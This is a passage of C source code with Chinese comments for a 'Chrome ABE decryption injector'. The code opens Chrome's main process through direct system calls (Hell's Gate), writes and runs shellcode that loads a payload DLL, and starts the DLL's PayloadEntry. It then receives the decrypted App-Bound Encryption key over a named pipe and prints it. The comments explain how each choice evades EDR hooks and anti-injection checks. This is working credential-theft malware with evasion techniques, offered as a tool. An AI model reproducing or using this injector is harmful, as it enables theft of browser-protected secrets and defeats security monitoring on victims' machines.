#define REMOTE_HMODULE_OFFSET     0x048   // hModule 输出槽
#define REMOTE_DLLPATH_OFFSET     0x050   // DLL 路径字符串

// 注意：整个远程块大小 = 0x050 + MAX_PATH * 2
#define REMOTE_BLOCK_SIZE         (0x050 + MAX_PATH * sizeof(wchar_t))

// ============================================================
// § 11  为什么通过共享内存读取 hModule（而不是 GetExitCodeThread）
// ============================================================
//
// GetExitCodeThread 返回的退出码是 DWORD（32 位）。
// 在 x64 进程中，HMODULE 是 64 位指针。
//
// 如果 DLL 加载到高地址（例如 0x7FF800000000），
// GetExitCodeThread 只能返回低 32 位（0x00000000），
// 导致我们拿到的 hModule 完全错误，计算出的 PayloadEntry 地址无效。
//
// 解决方案：让 shellcode 把完整的 64 位 hModule 写入目标进程内存的一个已知偏移，
// 然后用 ReadProcessMemory 读取完整的 8 字节。
// 这样无论地址有多高都不会截断。

// ============================================================
// § 12  为什么用 NtCreateThreadEx 而不是 CreateRemoteThread
// ============================================================
//
// CreateRemoteThread 是 kernel32 导出的高级封装，内部调用：
//   1. 尝试挂起/恢复调试器（触发 DbgUiRemoteBreakin）
//   2. 设置线程本地存储（TLS）
//   3. 最终调用 NtCreateThreadEx
//
// 问题：
//   a) CreateRemoteThread 是 EDR 监控的高优先级目标，
//      inline hook 几乎必然覆盖此函数。
//   b) CreateRemoteThread 会在创建线程时调用 DebugActiveProcess 相关代码，
//      某些 Chrome 的反调试/反注入机制可能检测到这个行为。
//   c) NtCreateThreadEx 支持 THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 标志，
//      可以隐藏线程，避免被调试器和 EDR 观察到线程创建事件。
//
// 我们使用直接系统调用的 NtCreateThreadEx，双重绕过：
//   1. 绕过 kernel32.CreateRemoteThread 上的 hook
//   2. 绕过 ntdll.NtCreateThreadEx 上的 hook（Hell's Gate）

// ============================================================
// § 13  主注入逻辑
// ============================================================

static BOOL InjectPayload(
    DWORD         targetPid,
    const wchar_t *dllPath,
    const BYTE    *dllBytes,    // DLL 文件字节（用于解析导出 RVA）
    const wchar_t *pipeName,    // 命名管道名称（传给 PayloadEntry）
    const BYTE    *encKey,      // 加密密钥字节
    SIZE_T         encKeyLen    // 加密密钥长度
)
{
    wprintf(L"[*] 目标 PID: %lu\n", targetPid);

    // ── 1. 打开目标进程 ──────────────────────────────────────
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = {};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)targetPid;
    cid.UniqueThread  = NULL;

    HANDLE hProcess = NULL;
    NTSTATUS st = DirectNtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &oa,
        &cid);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] NtOpenProcess 失败: 0x%08X\n", st);
        return FALSE;
    }
    wprintf(L"[+] 已打开目标进程句柄\n");

    // ── 2. 在目标进程分配 Stage 1 代码块内存 ─────────────────
    PVOID  remoteBlock = NULL;
    SIZE_T blockSize   = REMOTE_BLOCK_SIZE;
    st = DirectNtAllocateVirtualMemory(
        hProcess, &remoteBlock, 0, &blockSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 先可写，后改为可执行
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] 目标进程内存分配失败: 0x%08X\n", st);
        CloseHandle(hProcess);
        return FALSE;
    }
    wprintf(L"[+] 远程内存块: 0x%p，大小: %zu 字节\n", remoteBlock, blockSize);

    // ── 3. 填充 shellcode ─────────────────────────────────────
    BYTE localBlock[REMOTE_BLOCK_SIZE] = {};

    // 复制 shellcode 模板
    memcpy(localBlock + REMOTE_SHELLCODE_OFFSET,
           kStage1Template, sizeof(kStage1Template));

    // 填充 LoadLibraryW 地址（从本进程 kernel32 获取，ASLR 下不同进程地址相同）
    UINT64 llwAddr = (UINT64)(ULONG_PTR)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
    memcpy(localBlock + REMOTE_LOADLIBW_OFFSET, &llwAddr, 8);

    // 填充 DLL 路径字符串
    SIZE_T pathLen = wcslen(dllPath) + 1;
    memcpy(localBlock + REMOTE_DLLPATH_OFFSET,
           dllPath, pathLen * sizeof(wchar_t));

    // 计算 shellcode 中 RIP 相对偏移并回填
    // lea rcx, [rip + ?]  指令在偏移 4，操作数在偏移 7，指令下一条地址在偏移 11
    // 目标 = REMOTE_DLLPATH_OFFSET，相对于当前 RIP（偏移 11）的 delta
    BYTE *base = (BYTE *)remoteBlock;

    // lea rcx offset（偏移 7）= DLLPATH_VA - (shellcode_base + 11)
    INT32 leaOffset = (INT32)(
        (UINT64)(base + REMOTE_DLLPATH_OFFSET) -
        (UINT64)(base + REMOTE_SHELLCODE_OFFSET + 11));
    memcpy(localBlock + REMOTE_SHELLCODE_OFFSET + 7, &leaOffset, 4);

    // call [rip + ?] 指令在偏移 11，操作数在偏移 13，下条地址在偏移 17
    // 目标 = LOADLIBW_OFFSET，delta = LOADLIBW_VA - (shellcode_base + 17)
    INT32 callOffset = (INT32)(
        (UINT64)(base + REMOTE_LOADLIBW_OFFSET) -
        (UINT64)(base + REMOTE_SHELLCODE_OFFSET + 17));
    memcpy(localBlock + REMOTE_SHELLCODE_OFFSET + 13, &callOffset, 4);

    // mov [rip + ?] 指令在偏移 17，操作数在偏移 20，下条地址在偏移 24
    // 目标 = HMODULE_OFFSET，delta = HMODULE_VA - (shellcode_base + 24)
    INT32 movOffset = (INT32)(
        (UINT64)(base + REMOTE_HMODULE_OFFSET) -
        (UINT64)(base + REMOTE_SHELLCODE_OFFSET + 24));
    memcpy(localBlock + REMOTE_SHELLCODE_OFFSET + 20, &movOffset, 4);

    // ── 4. 写入目标进程内存 ───────────────────────────────────
    SIZE_T written = 0;
    st = DirectNtWriteVirtualMemory(
        hProcess, remoteBlock, localBlock, REMOTE_BLOCK_SIZE, &written);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] NtWriteVirtualMemory 失败: 0x%08X\n", st);
        CloseHandle(hProcess);
        return FALSE;
    }

    // ── 5. 将 shellcode 内存页改为可读执行 ────────────────────
    // 注意：只改 shellcode 所在的第一页，其余数据页保持 RW
    PVOID  protBase = remoteBlock;
    SIZE_T protSize = 0x40; // shellcode 占用不超过 64 字节
    ULONG  oldProt  = 0;
    st = DirectNtProtectVirtualMemory(
        hProcess, &protBase, &protSize, PAGE_EXECUTE_READ, &oldProt);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] NtProtectVirtualMemory 失败: 0x%08X\n", st);
        CloseHandle(hProcess);
        return FALSE;
    }
    wprintf(L"[+] shellcode 内存页已设置为 PAGE_EXECUTE_READ\n");

    // ── 6. 创建远程线程执行 Stage 1（调用 LoadLibraryW）────────
    HANDLE hThread = NULL;
    st = DirectNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)((BYTE *)remoteBlock + REMOTE_SHELLCODE_OFFSET),
        NULL,           // 参数（DLL 路径已硬编码在 shellcode 中）
        0,              // 不挂起，立即执行
        0, 0, 0,
        NULL);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] NtCreateThreadEx (Stage 1) 失败: 0x%08X\n", st);
        CloseHandle(hProcess);
        return FALSE;
    }
    wprintf(L"[+] Stage 1 线程已创建，等待 LoadLibraryW 完成...\n");

    // ── 7. 等待 Stage 1 完成（最多 10 秒）────────────────────
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);

    // ── 8. 读取 64 位 hModule（见 § 11 的解释）──────────────
    UINT64 hModule64 = 0;
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(
            hProcess,
            (BYTE *)remoteBlock + REMOTE_HMODULE_OFFSET,
            &hModule64, 8, &bytesRead) ||
        bytesRead != 8 || hModule64 == 0) {
        wprintf(L"[-] 读取 hModule 失败（LoadLibraryW 返回 NULL？DLL 路径是否正确？）\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    wprintf(L"[+] DLL 已加载到目标进程，hModule = 0x%llX\n", hModule64);

    // ── 9. 定位 PayloadEntry 地址 ────────────────────────────
    DWORD entryRVA = GetExportRVA(dllBytes, "PayloadEntry");
    if (!entryRVA) {
        wprintf(L"[-] DLL 中未找到 PayloadEntry 导出函数\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    UINT64 entryVA = hModule64 + entryRVA;
    wprintf(L"[+] PayloadEntry RVA=0x%08X, VA=0x%llX\n", entryRVA, entryVA);

    // ── 10. 构造 PayloadEntry 参数并写入目标进程 ─────────────
    // 参数布局（detail 见 payload_dll.cpp § 1）：
    //   [pipeName wchar_t, null-terminated]
    //   [DWORD keyLen]
    //   [keyBytes]
    //
    // 为什么要把参数打包在一块连续内存里？
    // NtCreateThreadEx 只接受一个 void* 参数（RCX），
    // 我们无法传多个参数，所以把所有参数序列化到一个结构体中。

    SIZE_T pipeNameLen  = (wcslen(pipeName) + 1) * sizeof(wchar_t);
    SIZE_T paramTotalSz = pipeNameLen + sizeof(DWORD) + encKeyLen;

    PVOID  remoteParam = NULL;
    SIZE_T paramAllocSz = paramTotalSz;
    st = DirectNtAllocateVirtualMemory(
        hProcess, &remoteParam, 0, &paramAllocSz,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] 参数内存分配失败: 0x%08X\n", st);
        CloseHandle(hProcess);
        return FALSE;
    }

    BYTE *paramBuf = (BYTE *)malloc(paramTotalSz);
    if (!paramBuf) { CloseHandle(hProcess); return FALSE; }

    // 使用 BYTE* 指针进行偏移运算
    // 为什么必须用 BYTE*？见 payload_dll.cpp § 13 的详细解释
    BYTE *ptr = paramBuf;
    memcpy(ptr, pipeName, pipeNameLen);
    ptr += pipeNameLen;
    *(DWORD *)ptr = (DWORD)encKeyLen;
    ptr += sizeof(DWORD);
    memcpy(ptr, encKey, encKeyLen);

    st = DirectNtWriteVirtualMemory(
        hProcess, remoteParam, paramBuf, paramTotalSz, &written);
    free(paramBuf);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] 写入参数失败: 0x%08X\n", st);
        CloseHandle(hProcess);
        return FALSE;
    }

    // ── 11. Stage 2：调用 PayloadEntry ────────────────────────
    hThread = NULL;
    st = DirectNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)(ULONG_PTR)entryVA,
        remoteParam,
        0, 0, 0, 0,
        NULL);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] NtCreateThreadEx (Stage 2) 失败: 0x%08X\n", st);
        CloseHandle(hProcess);
        return FALSE;
    }
    wprintf(L"[+] PayloadEntry 线程已启动\n");
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

// ============================================================
// § 14  wmain — 主控流程
// ============================================================

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"=== Chrome ABE 解密注入器 ===\n\n");

    // ── 初始化直接系统调用 ───────────────────────────────────
    if (!InitDirectSyscall()) {
        wprintf(L"[-] 系统调用初始化失败，退出\n");
        return 1;
    }
    wprintf(L"[+] Hell's Gate 直接系统调用初始化成功\n");

    // ── 确定 DLL 路径 ─────────────────────────────────────────
    wchar_t dllPath[MAX_PATH] = L"payload_dll.dll";
    if (argc >= 2) {
        wcsncpy(dllPath, argv[1], MAX_PATH - 1);
    }
    wprintf(L"[*] Payload DLL 路径: %s\n", dllPath);

    // ── 读取 DLL 文件（用于导出表解析）───────────────────────
    SIZE_T dllSize = 0;
    BYTE  *dllBytes = LoadPayloadDll(dllPath, &dllSize);
    if (!dllBytes) {
        wprintf(L"[-] 无法读取 payload DLL\n");
        return 1;
    }
    wprintf(L"[+] Payload DLL 读取成功，%zu 字节\n", dllSize);

    // ── 读取加密密钥 ─────────────────────────────────────────
    SIZE_T encKeyLen = 0;
    BYTE  *encKey = ReadEncryptedKey(&encKeyLen);
    if (!encKey) {
        wprintf(L"[-] 无法读取加密密钥\n");
        free(dllBytes);
        return 1;
    }

    // ── 生成唯一命名管道名称 ──────────────────────────────────
    GUID guid;
    CoCreateGuid(&guid);
    wchar_t pipeName[128];
    swprintf_s(pipeName, 128,
               L"\\\\.\\pipe\\abe_%08X%04X%04X",
               guid.Data1, guid.Data2, guid.Data3);
    wprintf(L"[*] 命名管道: %s\n", pipeName);

    // ── 创建命名管道（NULL DACL）─────────────────────────────
    HANDLE hPipe = CreateNullDaclPipe(pipeName);
    if (hPipe == INVALID_HANDLE_VALUE) {
        free(dllBytes);
        free(encKey);
        return 1;
    }
    wprintf(L"[+] 命名管道已创建\n");

    // ── 查找 Chrome 浏览器主进程 ──────────────────────────────
    DWORD chromePid = FindChromeBrowserPid();
    if (!chromePid) {
        CloseHandle(hPipe);
        free(dllBytes);
        free(encKey);
        return 1;
    }
    wprintf(L"[+] Chrome 主进程 PID: %lu\n", chromePid);

    // ── 执行注入 ─────────────────────────────────────────────
    if (!InjectPayload(chromePid, dllPath, dllBytes, pipeName, encKey, encKeyLen)) {
        wprintf(L"[-] 注入失败\n");
        CloseHandle(hPipe);
        free(dllBytes);
        free(encKey);
        return 1;
    }

    // ── 等待 payload 连接管道（最多 15 秒）───────────────────
    wprintf(L"[*] 等待 payload 连接命名管道...\n");
    if (!WaitForPipeClient(hPipe, 15000)) {
        wprintf(L"[-] 等待管道客户端超时\n");
        CloseHandle(hPipe);
        free(dllBytes);
        free(encKey);
        return 1;
    }
    wprintf(L"[+] Payload 已连接\n");

    // ── 读取解密后的密钥 ─────────────────────────────────────
    // 先读取 4 字节长度前缀
    DWORD decKeyLen = 0;
    DWORD bytesRead = 0;
    if (!ReadFile(hPipe, &decKeyLen, sizeof(DWORD), &bytesRead, NULL) ||
        bytesRead != sizeof(DWORD)) {
        wprintf(L"[-] 读取长度前缀失败\n");
        CloseHandle(hPipe);
        free(dllBytes);
        free(encKey);
        return 1;
    }

    if (decKeyLen == 0 || decKeyLen > 1024) {
        wprintf(L"[-] 返回的密钥长度异常: %lu\n", decKeyLen);
        CloseHandle(hPipe);
        free(dllBytes);
        free(encKey);
        return 1;
    }

    BYTE *decKey = (BYTE *)malloc(decKeyLen);
    if (!ReadFile(hPipe, decKey, decKeyLen, &bytesRead, NULL) ||
        bytesRead != decKeyLen) {
        wprintf(L"[-] 读取密钥数据失败\n");
        free(decKey);
        CloseHandle(hPipe);
        free(dllBytes);
        free(encKey);
        return 1;
    }
    CloseHandle(hPipe);

    // ── 输出明文密钥 ─────────────────────────────────────────
    wprintf(L"\n[+] 解密成功！明文密钥 (%lu 字节):\n", decKeyLen);
    for (DWORD i = 0; i < decKeyLen; i++) {
        wprintf(L"%02X ", decKey[i]);
        if ((i + 1) % 16 == 0) wprintf(L"\n");
    }
    wprintf(L"\n");

    free(decKey);
    free(dllBytes);
    free(encKey);
    return 0;
}
